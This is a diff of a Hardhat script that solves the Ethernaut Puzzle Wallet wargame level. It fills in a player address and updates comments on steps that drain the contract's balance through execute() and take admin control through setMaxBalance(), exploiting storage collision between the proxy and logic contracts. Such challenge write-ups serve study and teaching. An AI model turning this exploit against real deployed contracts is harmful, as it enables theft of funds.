@@ -4,7 +4,7 @@ import { ethers } from "hardhat";
 const attackPuzzleWallet = async () => {
     // change contract addresses here.
     const puzzleWalletAddress = "0xAc7EcD98B60C2094BdD63eEaF73436ebE8A28e9a"; //type "await contract.address()" in ethernaut console
-    const playerAddress = "";
+    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
 
     // Don't touch below
     // The vulnerability here arises due to storage collision between the proxy contract (PuzzleProxy) and logic contract (PuzzleWallet)
@@ -59,7 +59,7 @@ const attackPuzzleWallet = async () => {
     });
     const txReceipt3 = tx3.wait();
     // check balance after here
-    // execute to drain
+    // 4. execute() to drain contract balance
     const tx4 = await contractPuzzleWallet.execute(
         playerAddress,
         ethers.utils.parseEther("0.002"),
@@ -68,7 +68,7 @@ const attackPuzzleWallet = async () => {
     const txReceipt4 = tx4.wait();
     // puzzlew wallet balance should be 0
     console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance} (Should be 0 here)`);
-    //set maxbalance to change owner to player
+    // 5. From here we can setmaxbalance() to change admin to player
     const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
     const txReceipt5 = tx5.wait();
 };
